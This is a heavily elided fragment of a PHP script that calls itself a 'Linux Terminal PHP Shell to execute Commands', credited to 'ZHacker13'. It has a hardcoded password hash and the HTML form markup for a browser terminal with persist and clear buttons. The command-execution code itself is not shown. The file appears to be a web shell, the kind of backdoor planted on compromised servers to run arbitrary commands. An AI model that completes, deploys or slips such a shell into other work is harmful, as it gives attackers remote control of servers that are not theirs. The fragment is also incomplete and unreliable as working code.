<?php
        ...
        // Script: Linux Terminal PHP Shell to execute Commands,
        // By: ZHacker13,

	$password = "59335e33354d8c9cf4b3ece7c96513b5";
...
<body>
		...
		<div class="terminal" onclick="document.getElementById('command').focus();" id="terminal">
			...
			<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" class="commands" id="commands">
				...
				<div>
					...
					<input type="button" value="<?php if ($_SESSION['persist_commands'][$index]) { ?>Un-Persist<?php } else { ?>Persist<?php } ?>" onfocus="this.style.color='#00ff00';" onblur="this.style.color='';" onclick="toggle_persist_command(<?php echo $index; ?>);" class="persist_button" />
				...
				<input type="button" value="Persist" onfocus="this.style.color='#00ff00';" onblur="this.style.color='';" onclick="toggle_persist_command(<?php if (isset($_SESSION['commands'])) { echo count($_SESSION['commands']); } else { echo 0; } ?>);" class="persist_button" />
				<?php } ?>
			</form>
		</div>
	</div>
	...
	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
		...
		<input type="submit" value="Clear" onfocus="this.style.color='#00FF00';" onblur="this.style.color='';" />
	</form>
</body>
</html>